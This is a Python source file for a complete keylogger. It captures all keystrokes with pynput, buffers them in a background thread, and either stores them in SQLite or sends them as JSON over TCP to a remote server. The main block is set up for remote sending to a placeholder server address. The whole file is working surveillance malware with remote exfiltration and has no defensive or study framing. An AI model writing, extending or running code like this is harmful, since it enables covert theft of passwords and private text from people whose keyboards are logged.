from abc import ABC, abstractmethod
import threading
import time
from datetime import datetime
import logging
import sqlite3
from pynput import keyboard
import socket
import json

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self, device_id: str) -> str:
        """Start the keylogger"""
        pass

    @abstractmethod
    def stop_logging(self) -> str:
        """Stop the keylogger"""
        pass

    @abstractmethod
    def get_logged_keys(self) -> list[str]:
        """Return collected keystrokes"""
        pass

class KeyLogger(IKeyLogger):
    def __init__(self, db_path, remote_host=None, remote_port=None):
        self.db_path = db_path
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.device_id = None
        self.listener = None
        self.writer_thread = None
        self.last_write = time.time()
        self.remote_mode = bool(remote_host and remote_port)
        
        # Initialize DB (local or connect to remote)
        if not self.remote_mode:
            self.init_db()

    def init_db(self):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT NOT NULL,
                         timestamp TEXT NOT NULL,
                         content TEXT NOT NULL)''')
            conn.commit()
            conn.close()
            logger.debug("Database initialized successfully")
        except Exception as e:
            logger.error(f"Error initializing database: {e}")
            raise

    def on_press(self, key):
        try:
            if not self.running:
                return

            # Convert key to character
            if hasattr(key, 'char'):
                char = key.char
            elif key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.tab:
                char = '\t'
            else:
                char = f'[{str(key)}]'

            if char:
                with self.buffer_lock:
                    self.key_buffer.append(char)
                    logger.debug(f"Key pressed: {char}")

        except Exception as e:
            logger.error(f"Error in on_press: {e}")

    def write_to_db(self):
        while self.running:
            time.sleep(5)  # Reduced interval for remote operation
            current_time = time.time()
            with self.buffer_lock:
                if self.key_buffer and (current_time - self.last_write >= 2.0 or len(self.key_buffer) > 100):
                    try:
                        content = ''.join(self.key_buffer)
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
                        
                        if content.strip():
                            if self.remote_mode:
                                self.send_to_remote(content, timestamp)
                            else:
                                self.write_local(content, timestamp)
                            
                            self.key_buffer.clear()
                            self.last_write = current_time
                            
                    except Exception as e:
                        logger.error(f"Error writing data: {e}")

    def write_local(self, content, timestamp):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
                 (self.device_id, timestamp, content))
        conn.commit()
        conn.close()
        logger.debug(f"Successfully wrote to local DB: {timestamp} - {content}")

    def send_to_remote(self, content, timestamp):
        try:
            data = {
                'device_id': self.device_id,
                'timestamp': timestamp,
                'content': content
            }
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.remote_host, self.remote_port))
                sock.sendall(json.dumps(data).encode())
                response = sock.recv(1024).decode()
                
                if response != 'OK':
                    raise Exception(f"Remote server error: {response}")
                    
                logger.debug(f"Successfully sent to remote: {timestamp} - {content}")
                
        except Exception as e:
            logger.error(f"Error sending to remote: {e}")
            # Fallback to local storage if remote fails
            self.write_local(content, timestamp)

    def start_logging(self, device_id: str) -> str:
        if self.running:
            return "Keylogger is already running"

        try:
            self.device_id = device_id
            self.running = True
            
            # Start keyboard listener
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            # Start writer thread
            self.writer_thread = threading.Thread(target=self.write_to_db)
            self.writer_thread.daemon = True
            self.writer_thread.start()
            
            logger.debug(f"Started logging for device {device_id}")
            return "Keylogger started successfully"
                
        except Exception as e:
            self.running = False
            logger.error(f"Error starting keylogger: {e}")
            return f"Error starting keylogger: {str(e)}"

    def stop_logging(self) -> str:
        if not self.running:
            return "Keylogger is not running"

        try:
            self.running = False
            if self.listener:
                self.listener.stop()
            
            # Force write any remaining buffer
            with self.buffer_lock:
                if self.key_buffer:
                    content = ''.join(self.key_buffer)
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
                    
                    if self.remote_mode:
                        self.send_to_remote(content, timestamp)
                    else:
                        self.write_local(content, timestamp)
                        
                    self.key_buffer.clear()
                    
            return "Keylogger stopped successfully"
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
            return f"Error stopping keylogger: {str(e)}"

    def get_logged_keys(self) -> list[str]:
        if self.remote_mode:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((self.remote_host, self.remote_port))
                    request = {'type': 'get_logs', 'device_id': self.device_id}
                    sock.sendall(json.dumps(request).encode())
                    response = sock.recv(4096).decode()
                    return json.loads(response)
            except Exception as e:
                logger.error(f"Error getting remote logs: {e}")
                return []
        else:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                c.execute("SELECT content FROM keystrokes WHERE device_id = ? ORDER BY timestamp DESC", 
                         (self.device_id,))
                rows = c.fetchall()
                conn.close()
                return [row[0] for row in rows]
            except Exception as e:
                logger.error(f"Error getting logged keys: {e}")
                return []

if __name__ == "__main__":
    keylogger = KeyLogger("keylogger.db", remote_host="your_server_ip", remote_port=12345)
    print(keylogger.start_logging("Device-1")) 